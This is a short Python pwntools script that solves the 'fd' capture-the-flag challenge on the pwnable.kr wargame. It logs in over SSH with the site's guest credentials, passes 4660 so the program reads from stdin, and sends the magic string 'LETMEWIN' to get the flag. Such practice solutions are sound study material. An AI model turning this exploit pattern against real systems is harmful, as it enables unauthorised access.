#coding=utf-8
from pwn import *

s = ssh(host = 'pwnable.kr', port = 2222, user = 'fd', password = 'guest')
s.set_working_directory('/home/fd')
p = s.process(argv = ['./fd', '4660'])
p.sendline('LETMEWIN')
print p.recvall(1)
